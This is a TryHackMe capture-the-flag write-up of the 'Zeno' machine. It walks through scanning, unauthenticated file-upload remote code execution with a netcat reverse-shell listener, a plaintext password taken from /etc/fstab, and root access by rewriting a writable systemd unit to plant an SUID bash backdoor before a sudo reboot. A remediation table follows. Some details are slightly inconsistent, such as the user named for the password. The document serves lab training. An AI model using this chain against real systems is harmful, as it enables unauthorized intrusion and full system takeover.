# 🏛️ Zeno — TryHackMe Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![Category](https://img.shields.io/badge/Category-Web%20|%20RCE%20|%20Systemd%20Abuse-blue)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-green)

> **Author:** Miraç Akkuş (LatenT)  
> **Date:** May 2026

---

## 🚩 Flags

| Flag | Location | Value |
|------|----------|-------|
| **User Flag** | `/home/edward/user.txt` | `THM{...}` |
| **Root Flag** | `/root/root.txt` | `THM{...}` |

---

## 📋 Executive Summary

Zeno is a classic chain starting with unauthenticated file upload via Pathfinder Hotel Restaurant Management System, followed by plaintext credential discovery in `/etc/fstab`, and culminating in root access through a writable systemd unit file combined with reboot privileges.

---

## 🔍 Reconnaissance

```bash
rustscan <IP>
nmap -p22,12340 -sV <IP>
```

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 7.4 |
| 12340 | HTTP | Apache 2.4.6, PHP 5.4.16 |

```bash
gobuster dir -u http://<<IP>:12340 -w directory-list-2.3-medium.txt
```

**Discovery:** `/rms/` — Pathfinder Hotel Restaurant Management System

Google search for "Restaurant Management System PHP vulnerabilities" reveals: [XSS](https://www.sevenlayers.com/index.php/264-restaurant-management-system-1-0-xss-session-hijack), [arbitrary file upload](https://www.sevenlayers.com/index.php/265-restaurant-management-system-1-0-arbitrary-file-upload), [RCE](https://www.exploit-db.com/exploits/47520).

---

## 🌐 Initial Access: Unauthenticated RCE

The exploit-db script uses a hardcoded session cookie — this actually indicates no authentication is required. The script is a bit messy, so a simplified version was used ([rms_exploit.py](./rms_exploit.py)).

```bash
# Configure LHOST, RHOST, RPORT at lines 11-13
python3 rms_exploit.py
```

Listener:

```bash
nc -lnvp 4444
```

**Shell:**
```bash
sh-4.2$ id
uid=48(apache) gid=48(apache)
```

---

## 🚀 PrivEsc: apache → edward

Linpeas was run. Findings:

- Writable unit file: `/etc/systemd/system/zeno-monitoring.service`
- Plaintext password: `/etc/fstab` for user "zeno"

```bash
cat /etc/fstab
# zeno:<PASSWORD> format

su edward
# Password: value from /etc/fstab

id
uid=1000(edward)
```

**User flag:** `/home/edward/user.txt`

Same password works for SSH.

---

## 🏁 PrivEsc: edward → root

```bash
sudo -l
```

```
User edward may run the following commands on zeno:
    (ALL) NOPASSWD: /usr/sbin/reboot
```

**Plan:** Modify writable `zeno-monitoring.service`, reboot, get SUID bash.

### Unit File Modification

```bash
cat /etc/systemd/system/zeno-monitoring.service
```

```ini
[Unit]
Description=Zeno monitoring

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c "cp /home/edward/bd /tmp/bd && chmod u+s /home/edward/bd"

[Install]
WantedBy=multi-user.target
```

### Backdoor Creation and Reboot

```bash
# Create /home/edward/bd (bash copy)
cp /bin/bash /home/edward/bd

# Execute as root via reboot
sudo /usr/sbin/reboot
```

### Root Shell

After reboot:

```bash
ls -l /home/edward/bd
-rwsr-xr-x. 1 root root 964536 bd

./bd -p
bd-4.2# whoami
root
```

**Root flag:** `/root/root.txt`

---

## 🗺️ Attack Chain Summary

```
[/rms/ → Restaurant Management System]
    │
    ▼
[Unauthenticated file upload RCE]
    │
    ▼
[apache shell]
    │
    ▼
[Linpeas → /etc/fstab password]
    │
    ▼
[su edward]
    │
    ▼
[User flag]
    │
    ▼
[sudo -l: reboot NOPASSWD]
    │
    ▼
[zeno-monitoring.service writable]
    │
    ▼
[ExecStart → SUID bash]
    │
    ▼
[sudo reboot]
    │
    ▼
[./bd -p → root]
    │
    ▼
[Root flag]
```

---

## 🛡️ Remediation

| # | Vulnerability | Remediation |
|---|--------------|-------------|
| 1 | Unauthenticated file upload | Protect upload directory with auth; extension whitelist |
| 2 | Plaintext password (/etc/fstab) | Encrypt; use secrets management |
| 3 | Writable systemd unit | File permissions; root ownership |
| 4 | NOPASSWD reboot | Remove; or restrict emergency mode |

---

## 🎓 Key Takeaways

1. **Unauthenticated upload = gold** — If exploit-db script hardcodes a cookie, auth probably isn't required
2. **Always run Linpeas** — Finding passwords in `/etc/fstab` is classic but effective
3. **Writable systemd unit = root** — `ExecStart` runs as root, reboot privilege is sufficient
4. **SUID bash needs `-p`** — Without `-p` privileges drop, don't forget

---

**Author:** LatenT  
**Date:** May 2026
